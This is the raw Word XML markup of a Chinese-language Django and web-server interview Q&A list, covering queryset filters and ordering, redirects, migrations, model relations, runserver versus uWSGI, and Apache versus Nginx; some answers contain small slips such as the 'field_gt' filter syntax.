      <w:bookmarkEnd w:id="652"/>
      <w:bookmarkEnd w:id="653"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>032</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w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对数据查询结果排序怎么做，降序怎么做，查询大于某个字段怎么做</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DBAC089" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="654" w:name="4585-1535456060244"/>
      <w:bookmarkEnd w:id="654"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>排序使用 order_by()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00793791" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="655" w:name="9858-1535456068429"/>
      <w:bookmarkEnd w:id="655"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>降序需要在排序字段名前加-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45556974" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="656" w:name="8310-1535456068429"/>
      <w:bookmarkEnd w:id="656"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>查询字段大于某个值：使用 filter(字段名_gt=值)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BB4E52" w14:textId="1D7A079B"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57" w:name="6050-1535455950889"/>
      <w:bookmarkStart w:id="658" w:name="4930-1535456076947"/>
      <w:bookmarkEnd w:id="657"/>
      <w:bookmarkEnd w:id="658"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>033</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重定向你是如何实现的？用的什么状态码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B89A86" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="659" w:name="8795-1535456090222"/>
      <w:bookmarkEnd w:id="659"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用 HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790CCE88" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="660" w:name="3884-1535456090676"/>
      <w:bookmarkEnd w:id="660"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>redirect 和 reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5C3F06" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="661" w:name="5349-1535456090676"/>
      <w:bookmarkEnd w:id="661"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>状态码：302,301</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEAC0B1" w14:textId="09D9EE6F"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62" w:name="5424-1535456103837"/>
      <w:bookmarkStart w:id="663" w:name="5374-1535456091576"/>
      <w:bookmarkEnd w:id="662"/>
      <w:bookmarkEnd w:id="663"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>034</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生成迁移文件和执行迁移文件的命令是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EF1559" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="664" w:name="6617-1535456109842"/>
      <w:bookmarkEnd w:id="664"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>python manage.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1312E960" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="665" w:name="5969-1535456125350"/>
      <w:bookmarkEnd w:id="665"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>makemigrations python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578FCD08" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="666" w:name="4922-1535456133183"/>
      <w:bookmarkEnd w:id="666"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B99ED9" w14:textId="01533D6C"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67" w:name="6640-1535456109984"/>
      <w:bookmarkEnd w:id="667"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>035</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关系型数据库的关系包括哪些类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660FB6BB" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="668" w:name="8989-1535456157067"/>
      <w:bookmarkEnd w:id="668"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· ForeignKey：一对多，将字段定义在多的一端中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E22437" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="669" w:name="8860-1535456165231"/>
      <w:bookmarkEnd w:id="669"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· ManyToManyField：多对对：将字段定义在两端中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15940443" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="670" w:name="8530-1535456165231"/>
      <w:bookmarkEnd w:id="670"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>· OneToOneField：一对一，将字段定义在任意一端中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A742D3E" w14:textId="724BA335"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71" w:name="5097-1535456225475"/>
      <w:bookmarkStart w:id="672" w:name="6040-1535456226785"/>
      <w:bookmarkEnd w:id="671"/>
      <w:bookmarkEnd w:id="672"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>036</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查询集返回列表的过滤器有哪些？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F8987E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="673" w:name="2055-1535456227692"/>
      <w:bookmarkEnd w:id="673"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>all() ：返回所有的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFEBBA4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="674" w:name="2964-1535456227692"/>
      <w:bookmarkEnd w:id="674"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>filter()：返回满足条件的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43716050" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="675" w:name="7999-1535456227692"/>
      <w:bookmarkEnd w:id="675"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>exclude()：返回满足条件之外的数据，相当于 sql 语句中 where 部分的 not 关键字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C339E33" w14:textId="56D1FAD6" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="676" w:name="2469-1535456227692"/>
      <w:bookmarkEnd w:id="676"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>order_by()：排序</w:t>
      </w:r>
      <w:bookmarkStart w:id="677" w:name="2033-1535456227692"/>
      <w:bookmarkEnd w:id="677"/>
    </w:p>
    <w:p w14:paraId="1348EC50" w14:textId="3CB16092"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78" w:name="2090-1535456227692"/>
      <w:bookmarkEnd w:id="678"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>037</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判断查询集正是否有数据？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF5F8F6" w14:textId="64A66405" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="679" w:name="8372-1535456227692"/>
      <w:bookmarkEnd w:id="679"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>exists()：判断查询集中否有数据，如果有则返回 True，没有则返回 False。</w:t>
      </w:r>
      <w:bookmarkStart w:id="680" w:name="4061-1535456227692"/>
      <w:bookmarkEnd w:id="680"/>
    </w:p>
    <w:p w14:paraId="165CC0D3" w14:textId="1782B440"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81" w:name="9777-1535456227692"/>
      <w:bookmarkEnd w:id="681"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>038</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本身提供了</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> runserver</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，为什么不能用来部署？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5E0EC1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="682" w:name="6036-1535456227692"/>
      <w:bookmarkEnd w:id="682"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>runserver 方法是调试 Django 时经常用到的运行方式，它使用 Django  自带的 WSGI Server 运行，主要在测试和开发中使用，并且 runserver 开启的方式也是单进程 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5668F37B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="683" w:name="6187-1535456274842"/>
      <w:bookmarkEnd w:id="683"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>uWSGI 是一个 Web  服务器，它实现了 WSGI  协议、uwsgi、http  等协议。注意  uwsgi  是一种通信协议，而 uWSGI 是实现 uwsgi 协议和  WSGI  协议的 Web  服务器。uWSGI  具有超快的性能、低内存占用和多 app 管理等优点，并且搭配着  Nginx 就是一个生产环境了，能够将用户访问请求与应用 app 隔离开，实现真正的部署。相比来讲，支持的并发量更高，方便管理多进程，发挥多核的优势， 提升性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135188C8" w14:textId="7E69B54D"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84" w:name="6230-1535456251442"/>
      <w:bookmarkStart w:id="685" w:name="8456-1535456227692"/>
      <w:bookmarkEnd w:id="684"/>
      <w:bookmarkEnd w:id="685"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>039</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 apache </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> nginx </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F924FE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="686" w:name="6211-1535456227692"/>
      <w:bookmarkEnd w:id="686"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Nginx 相对 Apache 的优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260CF0ED" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="687" w:name="9223-1535456227692"/>
      <w:bookmarkEnd w:id="687"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>轻量级，同样起 web 服务，比 apache 占用更少的内存及资源；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598386F8" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="688" w:name="1562-1535456227692"/>
      <w:bookmarkEnd w:id="688"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>抗并发，nginx 处理请求是异步非阻塞的，支持更多的并发连接，而 apache 则是阻塞型的，在高并发下 nginx 能保持低资源低消耗高性能；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DDADE3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="689" w:name="9229-1535456227692"/>
      <w:bookmarkEnd w:id="689"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>配置简洁；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4464B67B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="690" w:name="1835-1535456227692"/>
      <w:bookmarkEnd w:id="690"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>高度模块化的设计，编写模块相对简单； 社区活跃。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B95E6E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="691" w:name="9853-1535456227692"/>
      <w:bookmarkEnd w:id="691"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Apache 相对 Nginx 的优点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70688251" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="692" w:name="4887-1535456227692"/>
      <w:bookmarkEnd w:id="692"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>rewrite ，比 nginx 的 rewrite 强大； 模块超多，基本想到的都可以找到；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745C4DE4" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="693" w:name="9559-1535456227692"/>
      <w:bookmarkEnd w:id="693"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>少 bug ，nginx 的 bug 相对较多； 超稳定。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14251666" w14:textId="0AF32312"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694" w:name="7020-1535456242634"/>
      <w:bookmarkStart w:id="695" w:name="7794-1535456227692"/>
      <w:bookmarkEnd w:id="694"/>
      <w:bookmarkEnd w:id="695"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>040</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varchar </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> char </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
